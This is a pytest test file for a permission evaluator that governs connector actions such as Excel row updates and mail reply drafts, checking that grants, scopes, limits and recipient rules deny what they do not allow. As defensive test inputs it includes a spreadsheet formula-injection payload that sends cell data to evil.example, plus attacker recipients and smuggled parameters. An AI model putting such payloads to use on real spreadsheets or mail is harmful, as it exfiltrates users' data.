"""CON-02, CON-03: each grant element allows what it grants and denies the rest, by reason."""

from decimal import Decimal
from typing import Any

import pytest

from collicity_grants import Record, evaluate, filter_response
from collicity_grants.models import (
    ActionKind,
    AdminPolicy,
    Allow,
    AppliedEffect,
    CallRequest,
    CapabilityGrant,
    Deny,
    DenyCode,
    ImpactTier,
)
from collicity_testing import grants as sample
from collicity_testing.grants import (
    CONNECTOR,
    FOLDER,
    OTHER_FOLDER,
    OTHER_TABLE,
    OTHER_WORKBOOK,
    TABLE,
    WORKBOOK,
)

MANIFEST = sample.manifest()
GRANTS = sample.grants()
POLICY = sample.policy()
SCOPES = sample.consented()
SENDER = "buyer@supplier.example"


def decide(
    request: CallRequest,
    *,
    grants: list[CapabilityGrant] = GRANTS,
    policy: AdminPolicy = POLICY,
    scopes: frozenset[str] = SCOPES,
) -> Allow | Deny:
    return evaluate(MANIFEST, grants, policy, scopes, request)


def denied(decision: Allow | Deny) -> DenyCode:
    assert isinstance(decision, Deny), f"expected a denial, got {decision}"
    return decision.code


def update(values: dict[str, Any], **fields: Any) -> CallRequest:
    defaults: dict[str, Any] = {
        "params": {"values": values, "row_id": "7"},
        "current_values": {"Qty": 10},
    }
    return sample.request("excel.update_row", **(defaults | fields))


def reply(to: Any, **fields: Any) -> CallRequest:
    defaults: dict[str, Any] = {
        "params": {"to": to, "message_id": "m1", "body": "Ordered."},
        "original_sender": SENDER,
    }
    return sample.request("mail.create_reply_draft", **(defaults | fields))


# ---- What the grants allow --------------------------------------------------------------------


def test_a_granted_read_is_allowed():
    decision = decide(sample.request("excel.read_rows", params={"top": 50}))
    assert decision == Allow(params={"top": 50}, impact=ImpactTier.LOW)


def test_a_granted_bounded_write_is_allowed_and_typed():
    decision = decide(update({"Qty": 60, "Status": "ordered"}))
    assert isinstance(decision, Allow)
    assert decision.params["values"] == {"Qty": 60, "Status": "ordered"}
    assert decision.counts_toward_volume


def test_a_reply_to_the_original_sender_is_allowed():
    assert isinstance(decide(reply([SENDER.upper()])), Allow)


# ---- Connector, action and policy -------------------------------------------------------------


def test_a_disabled_connector_is_refused():
    policy = AdminPolicy(enabled_connectors=frozenset())
    assert denied(decide(update({"Qty": 11}), policy=policy)) is DenyCode.CONNECTOR_DISABLED


def test_an_action_outside_the_manifest_is_refused():
    assert denied(decide(sample.request("excel.delete_table"))) is DenyCode.UNKNOWN_ACTION


@pytest.mark.parametrize(
    "fields",
    [{"manifest_version": "2026.9.0"}, {"connector": "graph-beta"}],
)
def test_a_different_manifest_is_refused(fields: dict[str, Any]):
    assert denied(decide(update({"Qty": 11}, **fields))) is DenyCode.MANIFEST_MISMATCH


def test_a_grant_pinned_to_another_manifest_version_is_refused():
    grants = [g.model_copy(update={"manifest_version": "2026.9.0"}) for g in GRANTS]
    assert denied(decide(update({"Qty": 11}), grants=grants)) is DenyCode.MANIFEST_MISMATCH


def test_an_ungranted_action_is_refused():
    grants = [g for g in GRANTS if g.action != "excel.update_row"]
    assert denied(decide(update({"Qty": 11}), grants=grants)) is DenyCode.NOT_GRANTED


def test_security_changes_are_refused_even_when_granted():
    request = sample.request(
        "sharepoint.grant_access",
        resources={"workbook": WORKBOOK},
        params={"principal": "attacker@evil.example", "role": "owner"},
    )
    assert denied(decide(request)) is DenyCode.SECURITY_CLASS


def test_an_admin_can_turn_off_an_action_kind_or_an_action():
    by_kind = AdminPolicy(
        enabled_connectors=frozenset({CONNECTOR}),
        disabled_kinds={CONNECTOR: frozenset({ActionKind.WRITE})},
    )
    by_action = AdminPolicy(
        enabled_connectors=frozenset({CONNECTOR}),
        disabled_actions={CONNECTOR: frozenset({"excel.update_row"})},
    )
    for policy in (by_kind, by_action):
        assert denied(decide(update({"Qty": 11}), policy=policy)) is DenyCode.DISABLED_BY_POLICY


def test_scopes_must_be_consented_and_allowed_by_the_admin():
    assert (
        denied(decide(update({"Qty": 11}), scopes=frozenset({"Files.Read"})))
        is DenyCode.SCOPE_NOT_CONSENTED
    )
    narrowed = AdminPolicy(
        enabled_connectors=frozenset({CONNECTOR}),
        allowed_scopes={CONNECTOR: frozenset({"Files.Read", "Mail.Read"})},
    )
    assert denied(decide(update({"Qty": 11}), policy=narrowed)) is DenyCode.SCOPE_NOT_ALLOWED


def test_an_action_without_a_cost_model_is_refused():
    assert denied(decide(sample.request("excel.recalculate"))) is DenyCode.NO_COST_MODEL


def test_unknown_params_are_refused():
    request = sample.request("excel.read_rows", params={"$expand": "permissions"})
    assert denied(decide(request)) is DenyCode.UNKNOWN_PARAM
    smuggled = update({"Qty": 11}, params={"values": {"Qty": 11}, "workbook": OTHER_WORKBOOK})
    assert denied(decide(smuggled)) is DenyCode.UNKNOWN_PARAM


# ---- Resource selector ------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("resources", "code"),
    [
        ({"workbook": OTHER_WORKBOOK, "table": TABLE}, DenyCode.RESOURCE_NOT_GRANTED),
        ({"workbook": WORKBOOK, "table": OTHER_TABLE}, DenyCode.RESOURCE_NOT_GRANTED),
        ({"workbook": WORKBOOK}, DenyCode.RESOURCE_UNRESOLVED),
        ({}, DenyCode.RESOURCE_UNRESOLVED),
        ({"workbook": WORKBOOK, "table": TABLE, "site": "s1"}, DenyCode.UNKNOWN_PARAM),
    ],
)
def test_resources_outside_the_selector_are_refused(resources: dict[str, str], code: DenyCode):
    assert denied(decide(update({"Qty": 11}, resources=resources))) is code


def test_reading_another_folder_is_refused():
    request = sample.request("mail.list_messages", resources={"folder": OTHER_FOLDER})
    assert denied(decide(request)) is DenyCode.RESOURCE_NOT_GRANTED


def test_an_action_whose_resource_is_known_only_after_the_call_needs_approval_each_time():
    decision = decide(sample.request("mail.search", params={"query": "invoice"}))
    assert isinstance(decision, Allow)
    assert decision.per_call_approval


# ---- Field allowlist and typed writes ---------------------------------------------------------


@pytest.mark.parametrize(
    ("values", "code"),
    [
        ({"Cost": 1}, DenyCode.FIELD_NOT_WRITABLE),  # a real field, not granted
        ({"Price": 1}, DenyCode.FIELD_NOT_WRITABLE),  # not a field at all
        ({}, DenyCode.INVALID_VALUE),
        ({"Qty": "11"}, DenyCode.INVALID_VALUE),  # a number field takes only numbers
        ({"Qty": True}, DenyCode.INVALID_VALUE),
        ({"Qty": float("nan")}, DenyCode.INVALID_VALUE),
        ({"Status": "cancelled"}, DenyCode.INVALID_VALUE),  # not one of the choices
        ({"Status": ["open"]}, DenyCode.INVALID_VALUE),
    ],
)
def test_writes_outside_the_field_allowlist_or_types_are_refused(
    values: dict[str, Any], code: DenyCode
):
    assert denied(decide(update(values))) is code


def test_writes_must_be_a_mapping():
    request = sample.request("excel.update_row", params={"values": [("Qty", 11)]})
    assert denied(decide(request)) is DenyCode.INVALID_VALUE


def test_text_writes_are_escaped_so_they_cannot_become_formulas():
    grants = [
        g.model_copy(update={"write_fields": g.write_fields | {"Note"}})
        if g.action == "excel.update_row"
        else g
        for g in GRANTS
    ]
    payload = '=WEBSERVICE("https://evil.example/?"&A1)'
    decision = decide(update({"Note": payload}), grants=grants)
    assert isinstance(decision, Allow)
    assert decision.params["values"]["Note"] == "'" + payload


# ---- Recipient rule ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "params",
    [
        {"to": ["attacker@evil.example"]},
        {"to": [SENDER, "attacker@evil.example"]},
        {"to": [SENDER], "cc": ["attacker@evil.example"]},
        {"to": [SENDER], "bcc": "attacker@evil.example"},
        {"to": []},
        {"to": [{"address": SENDER}]},
    ],
)
def test_replies_only_to_the_original_sender(params: dict[str, Any]):
    request = sample.request(
        "mail.create_reply_draft",
        params={"message_id": "m1", **params},
        original_sender=SENDER,
    )
    assert denied(decide(request)) is DenyCode.RECIPIENT_NOT_ALLOWED


def test_an_unverified_sender_satisfies_no_recipient_rule():
    request = reply([SENDER], original_sender=None)
    assert denied(decide(request)) is DenyCode.RECIPIENT_NOT_ALLOWED


def test_without_a_recipient_rule_no_recipient_is_allowed():
    grants = [
        g.model_copy(update={"recipient_rule": None})
        if g.action == "mail.create_reply_draft"
        else g
        for g in GRANTS
    ]
    assert denied(decide(reply([SENDER]), grants=grants)) is DenyCode.RECIPIENT_NOT_ALLOWED


# ---- Parameter limits -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("qty", "current", "allowed"),
    [
        (60, 10, True),  # +50
        (61, 10, False),  # +51
        (0, 10, True),
        (-1, 10, False),  # below min
        (Decimal("59.5"), Decimal("9.5"), True),
        (0.5, 51, False),  # -50.5
    ],
)
def test_qty_may_change_by_at_most_50_and_never_below_zero(qty: Any, current: Any, allowed: bool):
    decision = decide(update({"Qty": qty}, current_values={"Qty": current}))
    if allowed:
        assert isinstance(decision, Allow)
    else:
        assert denied(decision) is DenyCode.LIMIT_EXCEEDED


def test_a_bounded_change_needs_the_current_value():
    request = update({"Qty": 11}, current_values={})
    assert denied(decide(request)) is DenyCode.CURRENT_VALUE_UNKNOWN
    garbled = update({"Qty": 11}, current_values={"Qty": "ten"})
    assert denied(decide(garbled)) is DenyCode.CURRENT_VALUE_UNKNOWN


# ---- Volume limit -----------------------------------------------------------------------------


def test_at_most_20_records_per_run():
    assert isinstance(decide(update({"Qty": 11}, volume_used=19)), Allow)
    assert denied(decide(update({"Qty": 11}, volume_used=20))) is DenyCode.VOLUME_EXCEEDED
    batch = update({"Qty": 11}, volume_used=15, record_count=6)
    assert denied(decide(batch)) is DenyCode.VOLUME_EXCEEDED


# ---- Compensation (RUN-06) --------------------------------------------------------------------


def _effect(**fields: Any) -> AppliedEffect:
    base: dict[str, Any] = {
        "action": "excel.update_row",
        "resources": {"workbook": WORKBOOK, "table": TABLE},
        "prior_values": {"Qty": 10},
    }
    return AppliedEffect(**(base | fields))


def test_a_compensation_restores_exactly_the_recorded_values_outside_the_volume_limit():
    request = update({"Qty": 10}, compensating=_effect(), volume_used=20, current_values={})
    decision = decide(request)
    assert isinstance(decision, Allow)
    assert not decision.counts_toward_volume


@pytest.mark.parametrize(
    "request_",
    [
        update({"Qty": 11}, compensating=_effect()),  # not the recorded value
        update({"Qty": 10, "Status": "open"}, compensating=_effect()),
        update({"Qty": 10}, compensating=_effect(reversed=True)),
        update(
            {"Qty": 10},
            compensating=_effect(resources={"workbook": WORKBOOK, "table": OTHER_TABLE}),
        ),
        update({"Qty": 10}, compensating=_effect(action="excel.read_rows")),
    ],
)
def test_a_compensation_cannot_do_anything_else(request_: CallRequest):
    assert denied(decide(request_)) is DenyCode.COMPENSATION_INVALID


# ---- Impact tier (RUN-04) ---------------------------------------------------------------------


def test_impact_tiers():
    assert decide(update({"Qty": 11})).impact is ImpactTier.LOW  # type: ignore[union-attr]
    big = decide(update({"Qty": 11}, record_count=11))  # more than ten records
    assert isinstance(big, Allow)
    assert big.impact is ImpactTier.HIGH
    sends = decide(sample.request("mail.send", params={"to": [SENDER]}, original_sender=SENDER))
    assert isinstance(sends, Allow)
    assert sends.impact is ImpactTier.HIGH


# ---- Response filtering -----------------------------------------------------------------------


def test_responses_are_filtered_to_granted_resources_and_fields():
    action = MANIFEST.actions["excel.read_rows"]
    grant = next(g for g in GRANTS if g.action == "excel.read_rows")
    table = {"workbook": WORKBOOK, "table": TABLE}
    filtered = filter_response(
        action,
        grant,
        [
            Record(table, {"Item": "Bolt", "Qty": 4, "Cost": 9.5}),
            Record({"workbook": WORKBOOK, "table": OTHER_TABLE}, {"Item": "Salary", "Qty": 1}),
            Record({"workbook": WORKBOOK}, {"Item": "No table"}),
            Record({}, {"Item": "Anonymous"}),
        ],
    )
    assert filtered.records == [Record(table, {"Item": "Bolt", "Qty": 4})]
    assert filtered.dropped == 3
    assert filtered.hidden_fields == {"Cost"}


def test_folder_reads_drop_messages_from_other_folders():
    action = MANIFEST.actions["mail.list_messages"]
    grant = next(g for g in GRANTS if g.action == "mail.list_messages")
    filtered = filter_response(
        action,
        grant,
        [
            Record({"folder": FOLDER}, {"subject": "Order 20 bolts"}),
            Record({"folder": OTHER_FOLDER}, {"subject": "Payroll"}),
        ],
    )
    assert [r.fields["subject"] for r in filtered.records] == ["Order 20 bolts"]
